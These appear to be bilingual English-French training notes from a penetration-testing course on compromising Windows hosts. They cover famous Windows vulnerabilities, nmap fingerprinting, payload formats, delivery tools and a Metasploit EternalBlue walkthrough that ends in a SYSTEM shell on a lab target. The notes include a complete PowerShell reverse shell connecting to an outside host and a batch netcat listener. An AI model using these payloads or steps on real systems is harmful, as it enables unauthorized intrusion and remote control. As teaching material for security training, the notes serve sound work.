# Infiltrating Windows

***

For example, just in the last five years, there have been `3688` reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from [HERE](https://www.cvedetails.com/vendor/26/Microsoft.html)

***

<mark style="color:green;">**Windows Vulnerability Table**</mark>

![image](https://academy.hackthebox.com/storage/modules/115/window-vulns-table.png)

### <mark style="color:red;">Prominent Windows Exploits</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Vulnerability</strong></td><td><strong>Description</strong></td></tr><tr><td><code>MS08-067</code></td><td>MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.</td></tr><tr><td><code>Eternal Blue</code></td><td>MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.</td></tr><tr><td><code>PrintNightmare</code></td><td>A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it <a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">here</a>.</td></tr><tr><td><code>BlueKeep</code></td><td>CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.</td></tr><tr><td><code>Sigred</code></td><td>CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.</td></tr><tr><td><code>SeriousSam</code></td><td>CVE 2021-36924 exploits an issue with the way Windows handles permission on the <code>C:\Windows\system32\config</code> folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.</td></tr><tr><td><code>Zerologon</code></td><td>CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.</td></tr></tbody></table>

***

### <mark style="color:red;">Enumerating Windows & Fingerprinting Methods</mark>

{% hint style="warning" %}
* Utiliser le TTL dans les réponses ICMP (ping) peut aider à deviner le système d’exploitation.
* Les hôtes Windows renvoient typiquement un TTL de **32** ou **128** — **128** étant le plus courant.
* Le TTL diminue à chaque saut (hop), donc si vous êtes dans le même réseau L3 la valeur restera proche ; au-delà d’une vingtaine de hops, les recouvrements possibles avec d’autres OS deviennent plus probables.
* Ce n’est qu’un **indice heuristique** (utile mais non fiable à 100 %) — par exemple, un ping vers un Windows 10 renverra souvent TTL = 128.&#x20;
* This [link](https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.
{% endhint %}

<mark style="color:green;">**Pinged Host**</mark>

```bash
mrroboteLiot@htb[/htb]$ ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
```

<mark style="color:green;">**OS Detection Scan**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```

<mark style="color:green;">**Banner Grab to Enumerate Ports**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

***

### <mark style="color:red;">Bats, DLLs, & MSI Files, Oh My!</mark>

* Pour Windows, plusieurs formats de payload sont courants : **DLL**, **.bat (batch)**, **MSI** et **scripts PowerShell**.
* Chaque type peut réaliser des actions différentes (chargement en mémoire, exécution persistante, installation, exécution de commandes), mais tous sont exécutables sur la cible.
* Le choix du format dépend largement du **mécanisme de livraison** (par ex. email, exploit, exécution locale, installation), donc pensez d’abord à comment vous livrez le fichier.
* Certains formats (ex. MSI, DLL) permettent une intégration/persistabilité plus « native », tandis que d’autres (batch, PowerShell) sont plus simples et rapides à lancer.

***

<mark style="color:green;">**Payload Types to Consider**</mark>

<mark style="color:orange;">**DLLs (Dynamic Link Libraries)**</mark>

Une bibliothèque de liaison dynamique (DLL) est un fichier de bibliothèque utilisé dans les systèmes d'exploitation Microsoft pour fournir du code et des données partagés qui peuvent être utilisés par plusieurs programmes simultanément. Ces fichiers sont modulaires, ce qui permet d'avoir des applications plus dynamiques et plus faciles à mettre à jour.

Exemple : Lorsqu'un pentester injecte une DLL malveillante dans un processus existant, il peut potentiellement élever ses privilèges au niveau SYSTEM ou contourner les contrôles de compte utilisateur. Par exemple, en utilisant un outil comme DLL Injector, un attaquant peut introduire une DLL malveillante dans un processus légitime :

```c
// Exemple de code C pour charger une DLL
#include <Windows.h>
int main() {
HMODULE hDll = LoadLibrary("malicious.dll"); // Charge la DLL malveillante
// ...
return 0;
}
```

***

<mark style="color:orange;">**Fichiers Batch**</mark>

Les fichiers batch sont des **scripts textuels** utilisés par les administrateurs système pour effectuer automatiquement **plusieurs tâches** via l’**interpréteur de commandes** (comme `cmd.exe` sous Windows).

Ils portent l’extension **`.bat`** et permettent de **lancer des commandes en série** de manière automatisée sur la machine hôte.

Les fichiers batch sont des scripts basés sur du texte utilisés par les administrateurs système pour effectuer plusieurs tâches via l'interpréteur de commandes. Ces fichiers se terminent par l'extension .bat et permettent d'exécuter des commandes de manière automatisée.

Exemple : Un fichier batch peut contenir les commandes suivantes pour ouvrir un port et renvoyer des informations :

```batch
@echo off
netstat -an > C:\temp\network_connections.txt // Enregistre les connexions réseau
start cmd.exe /c "nc -l -p 4444" // Écoute sur le port 4444
```

***

<mark style="color:orange;">**VBS (VBScript)**</mark>

VBScript est un langage de script léger basé sur Visual Basic de Microsoft. Il est utilisé comme langage de script côté client dans les serveurs web pour permettre des pages web dynamiques. Bien que VBS soit désuet et désactivé dans la plupart des navigateurs modernes, il est encore utilisé dans le contexte du phishing et d'autres attaques.

Exemple : Un script VBS peut exécuter une commande dans l'invite de commandes :

```vba
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c echo Hello from VBS!"
```

***

<mark style="color:orange;">**Fichiers MSI**</mark>

Les fichiers .MSI servent de base de données d'installation pour l'installateur Windows. Lorsqu'une nouvelle application est installée, l'installateur cherche le fichier .msi pour comprendre tous les composants nécessaires.

Exemple : Pour créer un payload sous forme de fichier .msi, nous pourrions utiliser un outil comme WiX Toolset. Une fois le fichier .msi sur l'hôte, on peut l'exécuter :

```powershell
msiexec /i C:\path\to\payload.msi // Exécute le fichier .msi
```

***

<mark style="color:orange;">**PowerShell**</mark>

PowerShell est à la fois un environnement de shell et un langage de script. Il constitue l'environnement moderne de shell de Microsoft dans ses systèmes d'exploitation. C'est un langage dynamique basé sur le Common Language Runtime (.NET) qui traite l'entrée et la sortie comme des objets .NET.

Exemple : Un script PowerShell permettant d'établir une connexion inversée :

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
$stream = $client.GetStream()
[byte[]]$buffer = 0..65535 | % {0}
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
$sendback = (iex $data 2>&1 | Out-String)
$sendback2 = $sendback + "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte, 0, $sendbyte.Length)
$stream.Flush()
}
$client.Close()
```

***

### <mark style="color:red;">Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution</mark>

<mark style="color:green;">**Payload Generation**</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Resource</strong></td><td><strong>Description</strong></td></tr><tr><td><code>MSFVenom &#x26; Metasploit-Framework</code></td><td><a href="https://github.com/rapid7/metasploit-framework">Source</a> MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.</td></tr><tr><td><code>Payloads All The Things</code></td><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Source</a> Here, you can find many different resources and cheat sheets for payload generation and general methodology.</td></tr><tr><td><code>Mythic C2 Framework</code></td><td><a href="https://github.com/its-a-feature/Mythic">Source</a> The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.</td></tr><tr><td><code>Nishang</code></td><td><a href="https://github.com/samratashok/nishang">Source</a> Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.</td></tr><tr><td><code>Darkarmour</code></td><td><a href="https://github.com/bats3c/darkarmour">Source</a> Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.</td></tr></tbody></table>

{% hint style="warning" %}
<mark style="color:orange;">**Transfert et Exécution de Payloads**</mark>

Outre les vecteurs tels que les attaques de type "web drive-by", les emails de phishing ou les dépôts de fichiers, les hôtes Windows peuvent nous offrir plusieurs autres voies pour livrer un payload. La liste ci-dessous inclut quelques outils et protocoles utiles à utiliser lors de la tentative de déploiement d'un payload sur une cible.

**1. Impacket**

Impacket est une suite d'outils écrite en Python qui nous permet d'interagir directement avec les protocoles réseau. Certains des outils les plus intéressants d'Impacket concernent des fonctionnalités telles que **psexec**, **smbclient**, **WMI**, **Kerberos**, et la capacité de mettre en place un serveur SMB.

* **Explication :** Impacket est un outil très puissant qui facilite l'exécution de commandes à distance, le transfert de fichiers, et l'interaction avec divers protocoles réseau sur des machines Windows. Par exemple, l'utilisation de **psexec** permet d'exécuter des commandes sur une machine distante en utilisant des autorisations d'administrateur.

**2. Payloads All The Things**

Ce site est une excellente ressource pour trouver des exemples rapides de commandes pour aider à transférer des fichiers entre hôtes de manière efficace.

* **Explication :** Cette ressource compile une collection de scripts et de commandes qui peuvent être utilisés pour transférer des payloads rapidement et facilement. C'est particulièrement utile pour les pentesters qui cherchent à exécuter des actions spécifiques sans avoir à écrire un script complet.

**3. SMB (Server Message Block)**

SMB peut offrir une méthode facilement exploitable pour transférer des fichiers entre hôtes. Cela peut être particulièrement utile lorsque les hôtes victimes sont intégrés dans un domaine et utilisent des partages pour héberger des données. Nous, en tant qu'attaquants, pouvons utiliser ces partages de fichiers SMB ainsi que les partages C$ et admin$ pour héberger et transférer nos payloads et même exfiltrer des données via ces liens.

* **Explication :** SMB est un protocole de réseau qui permet le partage de fichiers et d'imprimantes sur des réseaux locaux. En tant qu'attaquant, exploiter SMB peut faciliter le transfert de fichiers, y compris des payloads malveillants, vers la machine cible. Les partages comme **C$** (le disque C de la machine) ou **admin$** (le partage administratif) offrent des accès potentiellement non sécurisés que les attaquants peuvent utiliser.

**4. Exécution à distance via MSF (Metasploit Framework)**

Intégré dans de nombreux modules d'exploitation de Metasploit, il existe une fonction qui construit, met en scène et exécute automatiquement les payloads.

* **Explication :** Metasploit est un framework largement utilisé pour le test de pénétration qui permet d'exploiter des failles de sécurité dans des systèmes. Sa fonctionnalité d'exécution à distance permet aux utilisateurs de déployer des payloads sans avoir à gérer manuellement chaque étape, ce qui simplifie considérablement le processus d'attaque.

**5. Autres Protocoles**

En examinant un hôte, des protocoles tels que **FTP**, **TFTP**, **HTTP/S**, et d'autres peuvent vous offrir une méthode pour uploader des fichiers sur l'hôte. Il est important d'énumérer et de prêter attention aux fonctions qui sont ouvertes et disponibles à l'utilisation.

* **Explication :** Divers protocoles de transfert de fichiers peuvent être exploités pour envoyer des payloads sur la machine cible. Par exemple, FTP est un protocole commun pour le transfert de fichiers qui pourrait être utilisé si un serveur FTP est accessible sur la cible. L'examen des services ouverts et des ports disponibles peut révéler des opportunités d'exploiter ces protocoles pour livrer des payloads malveillants.
{% endhint %}

***

### <mark style="color:red;">Example Compromise Walkthrough</mark>

1. <mark style="color:green;">**Enumerate The Host**</mark>

<mark style="color:orange;">**Enumerate the Host**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ nmap -v -A 10.129.201.97

```

Hôte identifié : **Windows Server 2016 Standard (6.3)** — on a le nom de machine et on sait qu’il **n’est pas joint à un domaine**.

* Plusieurs services exposés — il faut en tenir compte pour choisir la voie d’attaque potentielle.
* Vecteurs plausibles : **IIS** (service web), **SMB** (accès/abuse via outils comme Impacket ou via authentification si on possède des identifiants), ou une **faiblesse côté OS** menant à une RCE.
* MS17‑010 (EternalBlue) affecte les versions Windows allant de 2008 à Server 2016 — la cible se situe dans cette plage, donc c’est un candidat plausible.
* Pour confirmer, on peut utiliser un **module de vérification** (ex. l’auxiliaire `auxiliary/scanner/smb/smb_ms17_010` dans Metasploit) afin d’évaluer la présence de la vulnérabilité.

2. <mark style="color:green;">**Search for and decide on an exploit path**</mark>

<mark style="color:orange;">**Determine an Exploit Path**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options


msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
{% endcode %}

3. <mark style="color:green;">**Select Exploit & Payload, then Deliver**</mark>

<mark style="color:orange;">**Choose & Configure Our Exploit & Payload**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    .........
```
{% endcode %}

<mark style="color:orange;">**Configure The Exploit & Payload**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options
```
{% endcode %}

<mark style="color:orange;">**Validate Our Options**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```
{% endcode %}

4. <mark style="color:green;">**Execute Attack, and Receive A Callback.**</mark>

<mark style="color:orange;">**Execute Our Attack**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
{% endcode %}

5. <mark style="color:orange;">**Identify the Native Shell.**</mark>

**Identify Our Shell**

{% code fullWidth="true" %}
```shell-session
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
{% endcode %}

***

### <mark style="color:red;">CMD-Prompt and Power\[Shell]s for Fun and Profit.</mark>

* **CMD** est l’interpréteur MS‑DOS historique : simple, texte en entrée/sortie, scripts batch basiques, et souvent présent sur les vieux systèmes (XP et antérieurs).
* **PowerShell** est une console moderne basée sur .NET : elle comprend les cmdlets, manipule des objets .NET (pas juste du texte) et permet des scripts puissants et modulaires.
* **Traçabilité / furtivité** : CMD laisse moins de traces en session ; PowerShell conserve l’historique et peut être plus surveillé (Execution Policy, journalisation).
* **Compatibilité** : sur des hôtes très anciens sans PowerShell, CMD est parfois la seule option. PowerShell débarque à partir de Windows 7.
* **Contraintes** : UAC et les politiques d’exécution peuvent empêcher PowerShell (moins d’impact sur CMD).

Quand utiliser CMD :

* hôte ancien sans PowerShell ;
* besoin d’interactions simples (batch, commandes net, outils MS‑DOS) ;
* priorité à la furtivité ou contournement d’exécution de scripts.

Quand utiliser PowerShell :

* besoin de cmdlets, modules .NET ou scripts complexes ;
* interaction avec objets .NET ou services cloud ;
* on privilégie la puissance et la flexibilité plutôt que la discrétion.

